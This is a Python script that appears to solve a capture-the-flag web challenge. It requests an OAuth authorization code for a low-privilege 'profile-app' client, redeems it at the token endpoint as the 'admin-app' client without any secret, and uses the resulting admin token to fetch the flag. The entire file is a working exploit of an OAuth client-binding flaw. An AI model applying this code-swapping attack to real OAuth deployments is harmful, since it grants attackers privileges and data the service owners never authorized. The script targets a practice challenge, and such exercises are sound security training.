#!/usr/bin/env python3

import requests
import sys
import random
import string
from urllib.parse import urlparse, parse_qs

BASE_URL = "https://web300-1.pointeroverflowctf.com"
AUTH_START_ENDPOINT = f"{BASE_URL}/auth/start"
OAUTH_TOKEN_ENDPOINT = f"{BASE_URL}/oauth/token"
FLAG_ENDPOINT = f"{BASE_URL}/api/flag"

AUTH_CLIENT_ID = "profile-app"
TOKEN_CLIENT_ID = "admin-app"
REDIRECT_URI = f"{BASE_URL}/callback"
SCOPES = "profile:read friends:read"


def generate_state():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))


def get_authorization_code():
    state = generate_state()
    params = {
        "client_id": AUTH_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": SCOPES,
        "state": state
    }
    
    try:
        session = requests.Session()
        response = session.get(AUTH_START_ENDPOINT, params=params, allow_redirects=True)
        parsed_url = urlparse(response.url)
        query_params = parse_qs(parsed_url.query)
        
        if 'code' in query_params:
            return query_params['code'][0]
        return None
    except:
        return None


def get_access_token(auth_code):
    data = {
        "code": auth_code,
        "client_id": TOKEN_CLIENT_ID
    }
    
    try:
        response = requests.post(OAUTH_TOKEN_ENDPOINT, data=data)
        response.raise_for_status()
        token_data = response.json()
        return token_data.get("access_token")
    except:
        return None


def get_flag(access_token):
    headers = {"Authorization": f"Bearer {access_token}"}
    
    try:
        response = requests.get(FLAG_ENDPOINT, headers=headers)
        response.raise_for_status()
        flag_data = response.json()
        return flag_data.get("flag")
    except:
        return None


def main():
    auth_code = get_authorization_code()
    if not auth_code:
        sys.exit(1)
    
    access_token = get_access_token(auth_code)
    if not access_token:
        sys.exit(1)
    
    flag = get_flag(access_token)
    if flag:
        print(flag)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
